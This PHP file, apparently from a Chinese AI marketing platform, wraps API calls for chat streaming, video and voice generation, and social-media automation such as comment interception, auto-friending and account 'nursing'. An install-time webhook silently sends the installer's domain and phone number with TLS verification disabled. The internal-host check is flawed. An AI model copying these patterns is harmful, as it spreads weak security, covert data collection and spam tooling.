        $response['reasoning_content'] = null;
    if (!isset($response['usage_tokens']))
        $response['usage_tokens'] = [];
    //    Log::channel('ai')->write($eventData);

    if (str_contains($eventData, '"statusCode":403')) {
        ToolsStreamEmitErrorContent($request, '服务器链接出小差了，请稍后再试试吧');
        return strlen($eventData);
    }

    $jsonData = json_decode($eventData, true);
    if (isset($jsonData['code']) && (int) $jsonData['code'] == 10005) {
        message('当前平台算力余额不足，请联系站长');
        return false;
    }
    if (json_last_error() === JSON_ERROR_NONE && is_array($jsonData)) {
        // 新中台 OpenAI 风格：{"error":{"message":"..."}}
        if (isset($jsonData['error'])) {
            $errorMessage = ToolsExtractStreamErrorMessage($jsonData);
            if ($errorMessage === '') {
                $errorMessage = '请求失败，请稍后重试';
            }
            ToolsStreamEmitErrorContent($request, $errorMessage);
            return 0;
        }
        // 旧 Tools 风格错误码：用顶层 msg/message 经 loading+finished 输出
        if (isset($jsonData['code']) && !in_array((int)$jsonData['code'], [0, 10000], true)) {
            $errorMessage = ToolsExtractStreamErrorMessage($jsonData);
            if ($errorMessage === '') {
                $errorMessage = '请求失败，请稍后重试';
            }
            ToolsStreamEmitErrorContent($request, $errorMessage);
            return 0;
        }
        echo "data:" . json_encode([
            'object' => 'finished',
            'created' => time(),
            'content' => $jsonData['msg'] ?? ($jsonData['message'] ?? ''),
            'file_info' => $request['file_info'] ?? [], //文件信息
            'reasoning_content' => null,
            'usage' => [],
        ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . "\n\n";
        ob_flush();
        flush();
        return 0;
    }

    // 处理流数据
    $content = str_replace('data: ', "", $eventData);
    $jsons = explode("\n\n", $content);
    $gptModels = [
        'gpt-4',
        'gpt-4o',
        'gpt-4o-mini',
        'gpt-4o-2024-08-06',
        'gpt-3.5-turbo',
        'gpt-5.4',
        'gpt-5.4-mini',
        'gpt-5',
        'gpt-5-mini',
        'claude-sonnet-4-5',
        'claude-sonnet-4-6',
        'claude-sonnet-4-6-think'
    ];
    $geminiModels = [
        'gemini-2.5-pro',
        'gemini-2.5-flash',
        'gemini-2.0-flash',
        'gemma-3-4b-it',
        'gemini-3.1-pro-preview',
        'gemma-4-31b-it'
    ];
    foreach ($jsons as $content) {
        //        Log::channel('ai')->write('解析后的测试数据：'.$content);
        $_content = json_decode($content, true);

        // SSE 内嵌新中台/OpenAI 错误：data: {"error":{...}}
        if (is_array($_content) && isset($_content['error'])) {
            $errorMessage = ToolsExtractStreamErrorMessage($_content);
            if ($errorMessage === '') {
                $errorMessage = '请求失败，请稍后重试';
            }
            ToolsStreamEmitErrorContent($request, $errorMessage);
            return 0;
        }

        if (isset($request['model']) && in_array($request['model'], $geminiModels)) {
            $boolPayload = str_contains($content, 'DONE');
        } else if (isset($request['model']) && in_array($request['model'], $gptModels)) {
            $boolPayload = is_array($_content) && empty($_content['choices']) && !is_null($_content['usage']);
        } else {
            $boolPayload = str_contains($content, 'DONE');
        }

        // 处理流结束标记
        if ($boolPayload) {
            // 合并使用令牌
            if (!isset($response['usage_tokens']['total_tokens'])) {
                $response['usage_tokens'] = array_merge($response['usage_tokens'], $_content['usage']);
            }
            // 发送完成消息
            echo "data:" . json_encode([
                'object' => 'finished',
                'created' => time(),
                'content' => '',
                'file_info' => $request['file_info'] ?? [], //文件信息
                'reasoning_content' => $response['reasoning_content'],
                'usage' => $response['usage_tokens'],
                'task_id' => $request['task_id'],
                'check_robot_id' => $request['check_robot_id'] ?? 0,
            ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . "\n\n";
            // 保存聊天记录和处理扣费
            try {
                $request['file_id'] = isset($request['file_info']['id']) ? [$request['file_info']['id']] : []; //文件信息
                ChatLogic::saveChatResponseLog($request, [
                    'reply' => $response['reply'] ? $response['reply'] . ($content['choices'][0]['delta']['content'] ?? '') : '',
                    'reasoning_content' => $response['reasoning_content'] ?? null,
                    'usage_tokens' => $response['usage_tokens'] ?? [],
                    'extra' => [
                        'file' => $request['file_info'] ?? [], //文件信息
                    ]
                ]);

                ChatLogic::chatTokensCharge($request, $response['usage_tokens'] ?? []);

                if (isset($request['knowledge_record'])) {

                    \app\api\logic\KnowledgeLogic::saveKnowledgeRecord($request, [
                        'content' => $response['reply'] ? $response['reply'] . ($content['choices'][0]['delta']['content'] ?? '') : '',
                        'usage' => $response['usage_tokens'] ?? [],
                    ]);
                }
            } catch (\Throwable $e) {
                error_log("Stream callback error: " . $e->getMessage());
            }

            ob_flush();
            flush();
            unset($response);
            return strlen($eventData);
        }
        // 处理常规流数据
        $content = json_decode($content, true);
        if (!$content)
            return strlen($eventData);

        // 提取并累积内容
        $message = $content['choices'][0]['delta']['content'] ?? '';
        $reasoning_content = $content['choices'][0]['delta']['reasoning_content'] ?? null;
        $usage = $content['usage'] ?? [];
        if (isset($request['knowledge_tokens'])) {
            $usage['knowledge_tokens'] = $request['knowledge_tokens'];
            // if(isset($usage['total_tokens'])){
            //     $usage['total_tokens'] = $request['knowledge_tokens'] + $usage['total_tokens'];
            // }

        }

        $response['reply'] .= $message;
        $response['usage_tokens'] = $usage;

        // 提取推理内容
        if (!is_null($reasoning_content)) {

            $response['reasoning_content'] .= $reasoning_content;
        }

        // 发送加载消息
        echo "data:" . json_encode([
            'object' => "loading",
            'created' => time(),
            'content' => $message,
            'file_info' => $request['file_info'] ?? [], //文件信息
            'reasoning_content' => $reasoning_content,
            'usage' => $usage,
            'task_id' => $request['task_id'],
        ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . "\n\n";

        ob_flush();
        flush();
    }
    return strlen($eventData);
}

/**
 * 将 headers 格式化为 cURL 可以接受的格式
 */
function ToolsFormatHeaders(array $headers): array
{
    return array_map(
        fn($key, $value) => "$key: $value",
        array_keys($headers),
        $headers
    );
}


/**
 * 是否是内网地址
 * @param string $host
 * @return bool
 */
function ToolsIsInternalHost(string $host): bool
{
    // 提取主机部分（去掉 http:// 或 https://）
    $parsedUrl = parse_url($host);
    $hostName = $parsedUrl['host'] ?? $host;

    // 检查是否是 IP 地址
    if (filter_var($hostName, FILTER_VALIDATE_IP)) {

        // 检查是否在内网 IP 范围
        if (
            str_contains($hostName, '10.') || // A类
            str_contains($hostName, '192.168.') || // C类
            preg_match('/^172\.(1[6-9]|2[0-9]|3[0-1])\./', $hostName) || // B类
            $hostName === '127.0.0.1' // 环回地址
        ) {
            return true;
        }
    }

    // 检查是否是内网域名（如 .local 或 .lan）
    if ($hostName === 'localhost' || str_contains($hostName, '.local') || str_contains($hostName, '.lan')) {

        return true;
    }

    return false;
}

/**
 * 抛出错误信息
 */
function ToolsThrowMessage(string $meesage): void
{
    message($meesage);
}

//TODO 补充内置函数
if (!function_exists('app')) {

    function app($class)
    {

        return new $class();
    }
}

if (!function_exists('message')) {

    function message($message)
    {

        return json_encode(['code' => 0, 'message' => $message]);
    }
}


/**
 * AI 平台
 */
class SvService
{

    private string $wechatVerifyUrl = IMAI_TOOLS_WECHAT_VERIFY_URL;
    /**
     * 聊天
     * @return array
     */
    public function chat(array $params = []): array
    {

        $params['action'] = 'chat';
        return app(ToolsService::class)
            ->setApiUrl('/api/chat/completions')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 聊天
     * @return array
     */
    public function openaiChat(array $params = []): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/chat/completions')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }


    public function addfriends(array $params = []): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/sv/sph/addfriends')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function privatechat(array $params = []): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/sv/sph/privatechat')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 推送消息
     * @return array
     */
    public function push(array $params = []): array
    {

        $params['action'] = 'push';
        return app(ToolsService::class)
            ->setApiUrl('/api/sv/chat')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 获取在线状态
     * @return array
     */
    public function online(array $params = []): array
    {

        $params['action'] = 'online';
        return app(ToolsService::class)
            ->setApiUrl('/api/sv/chat')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 接受好友请求
     * @return array
     */
    public function accept(array $params = []): array
    {

        $params['action'] = 'accept';
        return app(ToolsService::class)
            ->setApiUrl('/api/sv/chat')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }


    public function text(array $params = [])
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/media/text')
            ->setRequestAndNotifyUrl($params, '/api/sv.copywriting/notify', ['user_id' => $params['user_id'], 'task_id' => $params['task_id'], 'id' => $params['id']])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function title(array $params = [])
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/media/title')
            ->setRequestAndNotifyUrl($params, '/api/sv.copywriting/notify', ['user_id' => $params['user_id'], 'task_id' => $params['task_id'], 'id' => $params['id']])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function subtitle(array $params = [])
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/media/subtitle')
            ->setRequestAndNotifyUrl($params, '/api/sv.copywriting/notify', ['user_id' => $params['user_id'], 'task_id' => $params['task_id'], 'id' => $params['id']])
            ->setMethod('POST')
            ->send()
            ->response;
    }


    public function detail(array $params = [])
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/media/detail')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function getSearchTerms(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/sv/searchText/create')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
    public function getMatrixCopywriting(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/matrixtext')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
    public function getNewsMixcutTittle(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/newsMixcutTitle')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function clip(array $params = [])
    {

        $url = config('app.app_host');
        $url = rtrim($url, '/');
        $params['upload_url'] = $url . url('/api/upload/svfile', [], false);
        if ($params['type'] == 1) {
            $params['notify_url'] = $url . url('/api/human/clipnotify', [], false);
        } else {
            $params['notify_url'] = $url . url('/api/sv.videoTask/clipnotify', [], false);
        }

        return app(ToolsService::class)
            ->setApiUrl('/api/sv/clip/create')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 图片识别
     * @return array
     */
    public function ocr(array $params = []): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/baidu/ocr/img2txt')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 图片识别
     * @return array
     */
    public function localOcr(array $params = []): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/baidu/ocr/localocr')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function getPublishContent(array $params = []): array
    {
        $params['channelVersion'] = 3;
        $params['now'] = time();
        return app(ToolsService::class)
            ->setApiUrl('/api/coze/text')
            ->setRequest($params)
            ->setMethod('POST')
            ->setTimeout(10, 180)
            ->send()
            ->response;
    }


    public function validateStrings(array $params = [], int $connectTimeout = 10, int $requestTimeout = 30): array
    {
        [$domain, $port] = ToolsGetCurrentSiteInfo();
        $params['source'] = $domain;
        //print_r($params);die;
        return app(ToolsService::class)
            ->setApiUrl($this->wechatVerifyUrl . '/validate_strings')
            ->setRequest($params)
            ->setMethod('POST')
            ->setTimeout($connectTimeout, $requestTimeout)
            ->send()
            ->response;
    }
    public function queryResult(array $params = [], int $connectTimeout = 10, int $requestTimeout = 30): array
    {
        return app(ToolsService::class)
            ->setApiUrl($this->wechatVerifyUrl . '/query_result')
            ->setRequest($params)
            ->setMethod('POST')
            ->setTimeout($connectTimeout, $requestTimeout)
            ->send()
            ->response;
    }


    public function douyin(array $params = []): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/media/douyin')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
}

class MinimaxService
{
    /**
     * 音频文件上传
     */
    public function upload(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/minimax/upload')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 声音克隆
     */
    public function voiceClone(array $params): array
    {

        $apiUrl = $params['model'] == 'speech-2.8-hd' ? '/api/minimax/voice_clone_hd' : '/api/minimax/voice_clone_turbo';
        return app(ToolsService::class)
            ->setApiUrl($apiUrl)
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function audio(array $params): array
    {
        $apiUrl = $params['model'] == 'speech-2.8-hd' ? '/api/minimax/audio_hd' : '/api/minimax/audio_turbo';
        return app(ToolsService::class)
            ->setApiUrl($apiUrl)
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
}

class ShanjianService
{
    /**
     * v2.11+ 闪剪队列接口请求封装。
     */
    private function v2Tools(): ToolsService
    {
        return app(ToolsService::class)->setHeader('X-Station-Version', 'v2');
    }

    /**
     * 批量查询闪剪单队列状态。
     */
    public function queueStatus(array $params): array
    {
        return $this->v2Tools()
            ->setApiUrl('/api/v2/shanjian/queue_status')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }

    /**
     * 声音克隆
     */
    public function voiceTrain(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/shanjian/voice_train')
            ->setMethod('POST')
            ->setRequestAndNotifyUrl($params, '/api/shanjian.shanjianAnchor/voicenotify', ['user_id' => $params['user_id'], 'task_id' => $params['task_id']])
            ->send()
            ->response;
    }

    public function singleVoiceTrain(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/shanjian/voice_train')
            ->setMethod('POST')
            ->setRequestAndNotifyUrl($params, '/api/shanjian.voice/notify', ['user_id' => $params['user_id'], 'task_id' => $params['task_id']])
            ->send()
            ->response;
    }
    /**
     * 任务状态
     */
    public function status(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/shanjian/status')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }

    /**
     * 一克三整单补偿退款。
     */
    public function batchRefund(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/task/batch-refund')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }

    /**
     * 智能剪辑模板列表
     */
    public function template(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/shanjian/template')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }

    /**
     * 中台闪剪剪辑模板列表
     */
    public function clipTemplate(array $params = []): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/shanjian/clip_template')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }

    /**
     * 极速数字人克隆
     */
    public function fastTrain(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/shanjian/fast_train')
            ->setMethod('POST')
            ->setRequestAndNotifyUrl($params, '/api/shanjian.shanjianAnchor/anchornotify', ['user_id' => $params['user_id'], 'task_id' => $params['task_id']])
            ->send()
            ->response;
    }

    /**
     * 专业数字人克隆
     */
    public function trainPro(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/shanjian/train_pro')
            ->setMethod('POST')
            ->setRequestAndNotifyUrl($params, '/api/shanjian.shanjianAnchor/anchornotify', ['user_id' => $params['user_id'], 'task_id' => $params['task_id']])
            ->send()
            ->response;
    }

    /**
     * 失败回调，中台退费
     */
    public function callback(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/shanjian/callback')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }

    /**
     * 真人口播混剪视频
     */
    public function realmanBroadcast(array $params): array
    {
        return $this->v2Tools()
            ->setApiUrl('/api/v2/shanjian/realman_broadcast')
            ->setMethod('POST')
            ->setRequestAndNotifyUrl($params, '/api/shanjian.shanjianVideoTask/notify', ['user_id' => $params['user_id'], 'task_id' => $params['task_id']])
            ->send()
            ->response;
    }

    /**
     * 素材混剪视频
     */
    public function mixcutBroadcast(array $params): array
    {
        return $this->v2Tools()
            ->setApiUrl('/api/v2/shanjian/mixcut_broadcast')
            ->setMethod('POST')
            ->setRequestAndNotifyUrl($params, '/api/shanjian.shanjianVideoTask/notify', ['user_id' => $params['user_id'], 'task_id' => $params['task_id']])
            ->send()
            ->response;
    }

    /**
     * 数字人口播混剪视频
     */
    public function virtualmanBroadcast(array $params): array
    {
        return $this->v2Tools()
            ->setApiUrl('/api/v2/shanjian/virtualman_broadcast')
            ->setMethod('POST')
            ->setRequestAndNotifyUrl($params, '/api/shanjian.shanjianVideoTask/notify', ['user_id' => $params['user_id'], 'task_id' => $params['task_id']])
            ->send()
            ->response;
    }

    /**
     * 数字人口播视频(无包装)
     */
    public function virtualman(array $params): array
    {
        return $this->v2Tools()
            ->setApiUrl('/api/v2/shanjian/virtualman_video')
            ->setMethod('POST')
            ->setRequestAndNotifyUrl($params, '/api/shanjian.shanjianVideoTask/notify', ['user_id' => $params['user_id'], 'task_id' => $params['task_id']])
            ->send()
            ->response;
    }

    public function text($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/shanjian/text')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function newsMixcut(array $params): array
    {
        return $this->v2Tools()
            ->setApiUrl('/api/v2/shanjian/news_mixcut')
            ->setMethod('POST')
            ->setRequestAndNotifyUrl($params, '/api/shanjian.shanjianVideoTask/notify', ['user_id' => $params['user_id'], 'task_id' => $params['task_id']])
            ->send()
            ->response;
    }
    public function aiAuthoried(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/shanjian/ai_authoried')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }

    public function aiCover(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/shanjian/aicover')
            ->setMethod('POST')
            ->setRequest($params)
            ->setRequestAndNotifyUrl($params, '/api/shanjian.shanjianVideoTask/covernotify', ['user_id' => $params['user_id'], 'task_id' => $params['task_id']])
            ->send()
            ->response;
    }
    /**
     * 闪剪 ASR（假接口，正式对接后改为 /v1/effect/asr）
     * 仅 Minimax TTS 后用于获取逐字时间戳
     */
    public function voiceAsr(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/shanjian/asr')
            ->setMethod('POST')
            ->setRequestAndNotifyUrl($params, '/api/minimax.voice/asrnotify', [
                'user_id'         => $params['user_id'],
                'task_id'         => $params['task_id'],
                'minimax_task_id' => $params['minimax_task_id'] ?? 0,
            ])
            ->send()
            ->response;
    }
}

class SoraService
{
    public function create($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/sora/video')
            ->setMethod('POST')
            ->setRequestAndNotifyUrl($params, '/api/sora.soraVideoTask/notifyNew', ['user_id' => $params['user_id'], 'task_id' => $params['task_id'], 'model_version' => 1])
            ->send()
            ->response;
    }

    public function proCreate($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/sora/video_pro')
            ->setMethod('POST')
            ->setRequestAndNotifyUrl($params, '/api/sora.soraVideoTask/notifyNew', ['user_id' => $params['user_id'], 'task_id' => $params['task_id'], 'model_version' => 2])
            ->send()
            ->response;
    }

    public function seedanceCreate($params): array
    {
        $modelVersion = $params['model_version'];
        $api = '';
        switch ($modelVersion) {
            case 3:
                $api = '/api/doubao/seedance/480image2video';
                break;
            case 4:
                $api = '/api/doubao/seedance/480video2video';
                break;
            case 5:
                $api = '/api/doubao/seedance/720image2video';
                break;
            case 6:
                $api = '/api/doubao/seedance/720video2video';
                break;
        }
        return app(ToolsService::class)
            ->setApiUrl($api)
            ->setMethod('POST')
            ->setRequestAndNotifyUrl($params, '/api/sora.soraVideoTask/notifySeedance', ['user_id' => $params['user_id'], 'task_id' => $params['task_id'], 'model_version' => $modelVersion])
            ->send()
            ->response;
    }

    public function seedanceStatus($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/doubao/seedance/status')
            ->setRequest($params)
            ->setMethod('POST')
            ->sendWithoutThrow()
            ->response;
    }

    public function drawAnchorCreate($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/sora/video')
            ->setMethod('POST')
            ->setRequestAndNotifyUrl($params, '/api/sora.soraAnchor/videoNotify', ['user_id' => $params['user_id'], 'task_id' => $params['task_id'], 'model_version' => 1])
            ->send()
            ->response;
    }

    public function text($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/sora/text')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function status($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/sora/status')
            ->setRequest($params)
            ->setMethod('POST')
            ->sendWithoutThrow()
            ->response;
    }

    public function anchorCreate($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/sora/anchor')
            ->setMethod('POST')
            ->setRequestAndNotifyUrl($params, '/api/sora.soraAnchor/notify', ['user_id' => $params['user_id'], 'task_id' => $params['task_id']])
            ->send()
            ->response;
    }

    public function drawAnchor($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/sora/draw_anchor')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }
}

class StoryboardService
{
    public function create($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/storyboard/video')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function status($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/storyboard/status')
            ->setRequest($params)
            ->setMethod('POST')
            ->sendWithoutThrow()
            ->response;
    }
}


class AutomationService
{

    const URL         = IMAI_AUTOMATION_URL;
    const BOT_ID      = IMAI_AUTOMATION_BOT_ID;
    const WORKFLOW_ID = IMAI_AUTOMATION_WORKFLOW_ID;
    const TOKEN       = IMAI_AUTOMATION_TOKEN;
    /**
     * 自动化社媒平台发布
     */
    public function socialMediaReleased($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/automation/socialMedia/released')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }

    /**
     * 自动化截流评论
     */
    public function shutOffComments($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/automation/shutOff/comments')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }

    /**
     * 自动化截流私信
     */
    public function shutOffObtain($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/automation/shutOff/obtain')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }

    /**
     * 自动化截流触达
     */
    public function shutOffPrivateLetter($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/automation/shutOff/privateLetter')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }
    /**
     * 自动化同城曝光任务
     */
    public function cityExposure($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/automation/shutOff/cityExposure')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }
    /**
     * 自动化同城截流获客任务
     */
    public function cityTouch($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/automation/shutOff/cityTouch')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }
    /**
     * 自动化团购任务
     */
    public function groupBuy($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/automation/shutOff/groupBuy')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }
    /**
     * 自动化精准获客任务
     */
    public function preciseClues($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/automation/shutOff/preciseClues')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }


    /**
     * 自动化社媒平台私信接管
     */
    public function socialMediaObtain($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/chat/completions')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }

    /**
     * 自动化社媒平台自动养号
     */
    public function socialMediaNursing($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/automation/socialMedia/nursing')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }

    /**
     * 自动化朋友圈评论
     */
    public function friendsCircleComments($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/chat/completions')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }

    /**
     * 自动化朋友圈发布
     */
    public function friendsCircleReleased($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/automation/friendsCircle/released')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }

    /**
     * 自动化朋友圈点赞
     */
    public function friendsCirclePraise($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/automation/friendsCircle/praise')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }

    /**
     * 自动化自动加微
     */
    public function wechatAddFriend($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/automation/wechat/addFriend')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }

    /**
     * 自动化获客视频号OCR
     */
    public function ocrLocal($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/automation/ocr/localocr')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }

    /**
     * 自动化获客本地OCR
     */
    public function ocrImg($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/automation/ocr/img2txt')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }

    /**
     * 账号Ip人设分析报告
     */
    public function analysis($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/automation/accountIp/analysis')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }
}

class AiPersonaService
{
    const URL         = IMAI_AIPERSONA_URL;
    const BOT_ID      = IMAI_AIPERSONA_BOT_ID;
    const WORKFLOW_ID = IMAI_AIPERSONA_WORKFLOW_ID;
    const AGENT_WORKFLOW_ID = IMAI_AIPERSONA_AGENT_WORKFLOW_ID;
    const TOKEN       = IMAI_AIPERSONA_TOKEN;

    /**
     * Ip人设分析
     */
    public function analysis($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/persona/analysis')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }

    /**
     * Ip人设报告
     */
    public function report($params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/persona/report')
            ->setMethod('POST')
            ->setRequest($params)
            ->send()
            ->response;
    }
}

/**
 * NotifyService 通知服务
 */
class NotifyService
{
    // 万维易源获取域名信息 API TOKEN
    private const TOKEN                  = IMAI_NOTIFY_TOKEN;

    // 万维易源获取域名信息 API URL
    private const ALIYUN_DOAMIN_INFO_URL = IMAI_NOTIFY_ALIYUN_DOMAIN_INFO_URL;

    // 系统安装客资推送群机器人 Webhook url
    private const WECHAT_WORK_NOTIFY_URL = IMAI_NOTIFY_WECHAT_WORK_URL;

    // WEBHOOK 验证安全盐
    private const WEBHOOK_SECRET_SALT    = IMAI_NOTIFY_WEBHOOK_SECRET_SALT;

    /**
     * 生成 Webhook 验证 token (私有，防止外部伪造)
     * @param string $domain
     * @param int $timestamp
     * @return string
     */
    private function generateWebhookToken(string $domain, int $timestamp): string
    {
        return md5($domain . $timestamp . self::WEBHOOK_SECRET_SALT);
    }

    /**
     * 派发异步 Webhook 任务
     * 内部生成 Token 并发起非阻塞 curl 请求，防止前端阻塞
     * @param string $domain 当前域名
     * @param string $mobile 手机号
     * @return void
     */
    public function dispatchWebhookAsync(string $domain, string $mobile): void
    {
        try {
            $timestamp = time();
            // 生成 Token
            $authToken = $this->generateWebhookToken($domain, $timestamp);

            // 判断是否 HTTPS
            $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://";
            $asyncTaskUrl = $protocol . $domain . '/install/async_webhook.php';

            $payload = [
                'domain' => $domain,
                'mobile' => $mobile,
                'timestamp' => $timestamp,
                'auth_token' => $authToken
            ];

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $asyncTaskUrl);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
            // 毫秒级超时，触发即走
            curl_setopt($ch, CURLOPT_TIMEOUT_MS, 150);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_exec($ch);
            curl_close($ch);
        } catch (\Exception $e) {
            // 吞没异常，不影响正常安装流程
        }
    }

    /**
     * 验证 Webhook token
     * @param string $domain
     * @param int $timestamp
     * @param string $token
     * @return bool
     */
    public function validateWebhookToken(string $domain, int $timestamp, string $token): bool
    {
        // 验证时间戳，防止重放攻击，有效期设为 2 分钟 (120秒)
        if (abs(time() - $timestamp) > 120) {
            return false;
        }

        return $token === $this->generateWebhookToken($domain, $timestamp);
    }

    /**
     * 核心组合入口：验证并执行Webhook推送操作
     * @param string $domain 当前域名
     * @param string $mobile 手机号
     * @param int $timestamp 触发时间戳
     * @param string $token 校验token
     * @return string
     */
    public function processWebhookTask(string $domain, string $mobile, int $timestamp, string $token): string
    {
        // 1. 验证签名（内部校验，防止外部和内部代码任意调用私有方法）
